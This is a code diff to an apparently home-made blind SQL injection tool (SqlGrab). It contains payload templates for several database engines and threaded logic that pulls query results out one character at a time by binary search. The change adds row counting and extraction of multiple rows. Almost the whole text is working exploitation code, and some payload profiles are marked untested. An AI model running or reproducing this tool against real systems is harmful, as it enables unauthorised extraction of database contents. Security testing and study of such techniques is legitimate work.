@@ -1,12 +1,11 @@
 from requests import Request, Session, PreparedRequest
 from typing import Callable, Literal
 from concurrent.futures import Future, ThreadPoolExecutor
-from functools import partial
 from http.server import BaseHTTPRequestHandler
 from io import BytesIO
 from dataclasses import dataclass
 import time
-from queue import Queue, ShutDown
+from queue import Queue
 from datetime import datetime
 import math
 import urllib.parse
@@ -38,62 +37,72 @@ ERR_UPPER_BOUND = '[!] An upper bound on the output length could not be found. M
 
 POSTGRESQL_PAYLOADS = { # avoids <, > and quotes
     'length': {
-        '>': 'SIGN(LENGTH(({query}))-{guess})=1',
-        '=': 'LENGTH(({query}))={guess}'
+        '>': 'SIGN(LENGTH(({row_query}))-{guess})=1',
+        '=': 'LENGTH(({row_query}))={guess}'
     },
     'character': {
-        '>': 'SIGN(ASCII(SUBSTRING(({query}),{index},1))-{guess})=1',
-        '=': 'SUBSTRING(({query}),{index},1)=CHR({guess})'
+        '>': 'SIGN(ASCII(SUBSTRING(({row_query}),{index},1))-{guess})=1',
+        '=': 'SUBSTRING(({row_query}),{index},1)=CHR({guess})'
     },
-    'compare': '({query})=$${guess}$$'
+    'count': {
+        '>': 'SIGN((SELECT COUNT(*) FROM ({query}) AS foo)-{guess})=1',
+        '=': '(SELECT COUNT(*) FROM ({query}) AS foo)={guess}'
+    },
+    'row': '{query} LIMIT 1 OFFSET {row}',
+    'compare': '({row_query})=$${guess}$$'
 }
 
-MYSQL_PAYLOADS = {
+MYSQL_PAYLOADS = POSTGRESQL_PAYLOADS # works for both, lol
+
+MSSQL_PAYLOADS = { # untested, sorry
     'length': {
-        '>': 'LENGTH(({query}))>{guess}',
-        '=': 'LENGTH(({query}))={guess}'
+        '>': 'LEN(({row_query}))>{guess}',
+        '=': 'LEN(({row_query}))={guess}'
     },
     'character': {
-        '>': 'SUBSTRING(({query}),{index},1)>CHR({guess})',
-        '=': 'SUBSTRING(({query}),{index},1)=CHR({guess})'
+        '>': 'SUBSTRING(({row_query}),{index},1)>CHR({guess})',
+        '=': 'SUBSTRING(({row_query}),{index},1)=CHR({guess})'
     },
-    'compare': 'STRCMP(({query}),{guess})'
+    'count': {
+        '>': '(SELECT COUNT(*) FROM ({query}) AS foo)>{guess}',
+        '=': '(SELECT COUNT(*) FROM ({query}) AS foo)={guess}'
+    },
+    'row': '{query} OFFSET {row} ROWS FETCH NEXT 1 ROWS ONLY',
+    'compare': '({row_query})=\'{guess}\''
 }
 
-MSSQL_PAYLOADS = {
+ORACLE_PAYLOADS = { # untested, sorry
     'length': {
-        '>': 'LEN(({query}))>{guess}',
-        '=': 'LEN(({query}))={guess}'
+        '>': 'LENGTH(({row_query}))>{guess}',
+        '=': 'LENGTH(({row_query}))={guess}'
     },
     'character': {
-        '>': 'SUBSTRING(({query}),{index},1)>CHR({guess})',
-        '=': 'SUBSTRING(({query}),{index},1)=CHR({guess})'
+        '>': 'SUBSTR(({row_query}),{index},1)>CHR({guess})',
+        '=': 'SUBSTR(({row_query}),{index},1)=CHR({guess})'
     },
-    'compare': '({query})=\'{guess}\''
+    'count': {
+        '>': '(SELECT COUNT(*) FROM ({query}) AS foo)>{guess}',
+        '=': '(SELECT COUNT(*) FROM ({query}) AS foo)={guess}'
+    },
+    'row': '{query} OFFSET {row} ROWS FETCH NEXT 1 ROWS ONLY',
+    'compare': '({row_query})=\'{guess}\''
 }
 
-ORACLE_PAYLOADS = {
+DATABRICKS_PAYLOADS = { # untested, sorry
     'length': {
-        '>': 'LENGTH(({query}))>{guess}',
-        '=': 'LENGTH(({query}))={guess}'
+        '>': 'length(({row_query}))>{guess}',
+        '=': 'length(({row_query}))={guess}'
     },
     'character': {
-        '>': 'SUBSTR(({query}),{index},1)>CHR({guess})',
-        '=': 'SUBSTR(({query}),{index},1)=CHR({guess})'
+        '>': 'substr(({row_query}),{index},1)>CHR({guess})',
+        '=': 'substr(({row_query}),{index},1)=CHR({guess})'
     },
-    'compare': '({query})=\'{guess}\''
-}
-
-DATABRICKS_PAYLOADS = {
-    'length': {
-        '>': 'length(({query}))>{guess}',
-        '=': 'length(({query}))={guess}'
+    'count': {
+        '>': '(select count(*) from ({query}) as foo)>{guess}',
+        '=': '(select count(*) from ({query}) as foo)={guess}'
     },
-    'character': {
-        '>': 'substr(({query}),{index},1)>CHR({guess})',
-        '=': 'substr(({query}),{index},1)=CHR({guess})'
-    },
-    'compare': '({query})=\'{guess}\''
+    'row': '{query} limit 1 offset {row}',
+    'compare': '({row_query})=\'{guess}\''
 }
 
 PROFILES = {
@@ -104,6 +113,136 @@ PROFILES = {
     'databricks': DATABRICKS_PAYLOADS
 }
 
+class SafeDict(dict):
+    def __missing__(self, key):
+        return '{' + key + '}'
+    
+def p(payload: str, **kwargs) -> str:
+    return payload.format_map(SafeDict(**kwargs))
+
+def _make_payloads(payloads: dict, **kwargs) -> dict[str|dict]:
+    ''' Replaces {row_query} in all payloads '''
+    new = {}
+    for k, v in payloads.items():
+        if type(v) is dict:
+            new[k] = _make_payloads(v, **kwargs)
+        elif type(v) is str:
+            new[k] = p(v, **kwargs)
+    return new
+
+@dataclass
+class Context:
+    task_id: int
+    min: int
+    max: int
+    guess: int
+    errored: bool = False
+    done: bool = False
+
+@dataclass
+class RowGrabber:
+    parent: 'SqlGrab'
+
+    def grab(self, row) -> str:
+        self.row = row
+        self.payloads = _make_payloads(self.parent.payloads, row=row)
+        length = self._get_length()
+        return self._get_string(length=length)
+
+    def _length_update(self, context: Context, _):
+            print(f'[{self.row + 1}/{self.parent.num_rows}] \x1B[90mDetermining length (between {context.min} and {context.max})\x1B[0m', end='\033[K\r')
+
+    def _get_length(self) -> int:
+        payloads = self.payloads['length']
+        results = self.parent._run_grabbers(
+            workers=[
+                ValueGrabber(
+                    bigger=payloads['>'],
+                    equals=payloads['='],
+                    eval_cb=self.parent.evaluate,
+                    progress=self.parent.progress_queue
+                ).grab
+            ],
+            guess=INITIAL_LENGTH,
+            update=self._length_update
+        )
+        return results[0]
+    
+    def _string_update(self, context: Context, results: list[Context]):
+        results[context.task_id] = context
+        done = [r for r in results if r is not None and r.done]
+        output = f'[{self.row + 1}/{self.parent.num_rows}] \x1B[90m[{str(len(done))}/{str(len(results))}]\x1B[0m '
+        for r in results:
+            output += (
+                f'\x1B[90m-\x1B[0m' if r == None else
+                f'\x1B[31m{chr(r.guess)}\x1B[0m' if r.errored else
+                f'\x1B[32m{chr(r.guess)}\x1B[0m' if r.done else
+                f'\x1b[90m{chr(r.guess)}\x1B[0m'
+            )
+        print(output, end='\033[K\r')
+
+    def _get_string(self, length: int):
+        payloads: dict[str, str] = self.payloads['character']
+        results = self.parent._run_grabbers([
+                ValueGrabber(
+                    bigger=p(payloads['>'], index=i + 1),
+                    equals=p(payloads['='], index=i + 1),
+                    eval_cb=self.parent.evaluate,
+                    task_id=i,
+                    progress=self.parent.progress_queue,
+                    range=(CHAR_MIN, CHAR_MAX)
+                ).grab
+                for i in range(length)
+            ],
+            guess=INITIAL_CHAR,
+            update=self._string_update
+        )
+        result = ''.join([chr(r) for r in results])
+        
+        if not self.parent.evaluate(p(self.payloads['compare'], guess=result)):
+            raise RuntimeError(ERR_SANITY_CHECK)
+
+        return result
+
+@dataclass
+class ValueGrabber:
+    bigger: str
+    equals: str
+    eval_cb: Callable 
+    progress: Queue
+    task_id: int | None = None
+    range: tuple[int,int] = (0,math.inf)
+
+    def grab(self, guess: int) -> int:
+        ''' Determines the value of a variable based on iterative halving/doubling of the search space '''
+        min, max = self.range       
+
+        while min != max:
+            is_bigger = self.eval_cb(
+                self.bigger.format(guess=guess)
+            )
+            if is_bigger:
+                min = guess + 1
+            else:
+                max = guess
+
+            if max == math.inf: # double value to find upper bound if not already found
+                guess *= 2
+            else: # narrow down between that range
+                guess = min + int((max - min) / 2)
+            
+            progress = Context(self.task_id, min, max, guess)
+            self.progress.put(progress)
+
+            if guess > 2**32:
+                raise RuntimeError(ERR_UPPER_BOUND)
+
+        if self.eval_cb(self.equals.format(guess=guess)):
+            progress.done = True
+        else:
+            progress.errored = True
+        self.progress.put(progress)
+        return guess
 
 @dataclass
 class SqlGrab:
@@ -116,6 +255,7 @@ class SqlGrab:
     proxy: str | None = None
     output: bool=False
     requests: int = 0
+    progress_queue: Queue = Queue()
 
     def __post_init__(self):
         self.payloads = PROFILES[self.dbms]
@@ -134,155 +274,71 @@ class SqlGrab:
             **kwargs
         )
     
-    @staticmethod
-    def _insert_query(payloads: dict, query: str) -> dict[partial]:
-        ''' Replaces {query} in all payloads '''
-        for k, v in payloads.items():
-            if type(v) is dict:
-                payloads[k] = SqlGrab._insert_query(v, query=query)
-            elif type(v) is str:
-                payloads[k] = partial(v.format, query=query)
-        return payloads
+    def _count_update(self, context: Context, _):
+            print(f'[+] \x1B[90mDetermining result row count (between {context.min} and {context.max})\x1B[0m\033[K', end='\033[K\r')
 
-    def grab(self, query: str) -> str:
-        if self.output:
-            print(f'[+] Grabbing: \'{query}\'')
+    def _get_count(self) -> int:
+        payloads = self.payloads['count']
+        results = self._run_grabbers(
+            workers=[
+                ValueGrabber(
+                    bigger=payloads['>'],
+                    equals=payloads['='],
+                    eval_cb=self.evaluate,
+                    progress=self.progress_queue
+                ).grab
+            ],
+            guess=INITIAL_LENGTH,
+            update=self._count_update
+        )
+        return results[0]
+
+    def grab(self, query: str) -> list[str]:
+        if self.output: print(f'[+] Grabbing: \'{query}\'...')
         self.session = Session()
-        self.payloads = self._insert_query(
+        self.payloads['row'] = p(self.payloads['row'], query=query)
+        self.payloads = _make_payloads(
             payloads=self.payloads,
+            row_query=self.payloads['row'],
             query=query
         )
         start = datetime.now()
-        length = self._get_length()
-        result = self._get_string(length)
+        self.num_rows = self._get_count()
+        if self.output: print(f'[+] Found: {self.num_rows} rows', end='\033[K\n')
+        results = []
+        row_grabber = RowGrabber(parent=self)
+        has_error = False
+        for row in range(self.num_rows):
+            try:
+                results.append(row_grabber.grab(row))
+                if self.output: print()
+            except RuntimeError as e:
+                has_error = True
         elapsed = datetime.now() - start
         if self.output:
             print(f'[+] Sent {self.requests} requests in {elapsed.total_seconds()} seconds')
-
-        return result
-
-    def _get_length(self) -> int:
-        payloads = self.payloads['length']
-
-        def update(c: SqlGrab.ValueGrabber.Context):
-            print(f'[+] \x1B[90mDetermining length (Between {c.min} and {c.max})\x1B[0m\033[K', end='\r')
-
-        progress_queue: Queue = Queue()
-        future = self.executor.submit(
-            self.ValueGrabber(
-                bigger=payloads['>'],
-                equals=payloads['='],
-                eval_cb=self.evaluate,
-                progress=progress_queue
-            ).grab,
-            guess=INITIAL_LENGTH
-        )
-
-        if self.output:
-            while not future.done() or not progress_queue.empty():
-                context: dict = progress_queue.get(block=True)
-                update(context)
-
-        return future.result()
-
-    def _get_string(self, length: int):
-        payloads = self.payloads['character']
-        results: list[SqlGrab.ValueGrabber.Context] = [
-            None for _ in range(length)
+            print('\n'.join(results))
+            if has_error: print(ERR_SANITY_CHECK)
+        return results
+        
+    def _run_grabbers(self, workers: list[Callable], guess: int, update: Callable) -> list:
+        results: list[Context] = [
+            None for _ in range(len(workers))
         ]
-
-        def update(c: SqlGrab.ValueGrabber.Context):
-            results[c.task_id] = c
-            done = [i for i, f in enumerate(futures) if f.done()]
-            output = f'\x1B[90m[{str(len(done))}/{str(len(results))}]\x1B[0m '
-            for r in results:
-                output += (
-                    f'\x1B[90m-\x1B[0m' if r == None else
-                    f'\x1B[31m{chr(r.guess)}\x1B[0m' if r.errored else
-                    f'\x1B[32m{chr(r.guess)}\x1B[0m' if r.task_id in done else
-                    f'\x1b[90m{chr(r.guess)}\x1B[0m'
-                )
-            print(output + '\033[K', end='\r')
-
-        progress_queue: Queue = Queue()
+        
         futures: list[Future] = [
             self.executor.submit(
-                self.ValueGrabber(
-                    bigger=partial(payloads['>'], index=i + 1),
-                    equals=partial(payloads['='], index=i + 1),
-                    eval_cb=self.evaluate,
-                    task_id=i,
-                    progress=progress_queue,
-                    range=(CHAR_MIN, CHAR_MAX)
-                ).grab,
-                guess=INITIAL_CHAR
-            ) for i in range(length) 
+                worker,
+                guess=guess
+            ) for worker in workers
         ]
         
         if self.output:
-            while not all(f.done() for f in futures) or not progress_queue.empty():
-                context: dict = progress_queue.get(block=True)
-                update(context)
-            print()
+            while not all(f.done() for f in futures) or not self.progress_queue.empty():
+                context: dict = self.progress_queue.get(block=True)
+                update(context, results)
 
-        result = ''.join([chr(f.result()) for f in futures])
-        
-        if not self.evaluate(self.payloads['compare'](guess=result)):
-            raise RuntimeError(ERR_SANITY_CHECK)
-
-        return result
-
-    @dataclass
-    class ValueGrabber:
-        bigger: partial
-        equals: partial
-        eval_cb: Callable 
-        progress: Queue
-        task_id: int | None = None
-        range: tuple[int,int] = (0,math.inf)
-
-        @dataclass
-        class Context:
-            task_id: int
-            min: int
-            max: int
-            guess: int
-            errored: bool = False
-
-        def grab(self, guess: int) -> int:
-            ''' Determines the value of a variable based on iterative halving/doubling of the search space '''
-            min, max = self.range       
-
-            while min != max:
-                is_bigger = self.eval_cb(
-                    self.bigger(guess=guess)
-                )
-                if is_bigger:
-                    min = guess + 1
-                else:
-                    max = guess
-
-                if max == math.inf: # double value to find upper bound if not already found
-                    guess *= 2
-                else: # narrow down between that range
-                    guess = min + int((max - min) / 2)
-                if guess > 2**32:
-                    raise RuntimeError(ERR_UPPER_BOUND)
-                
-                self.progress.put(
-                    self.Context(self.task_id, min, max, guess)
-                )
-
-            if self.eval_cb(self.equals(guess=guess)):
-                self.progress.put(
-                    self.Context(self.task_id, min, max, guess)
-                )
-            else:
-                self.progress.put(
-                    self.Context(self.task_id, min, max, guess, errored=True)
-                )
-            return guess
-                #raise RuntimeError(ERR_SANITY_CHECK)
+        return [f.result() for f in futures]
 
     @staticmethod
     def urlEncode(text: str) -> str:
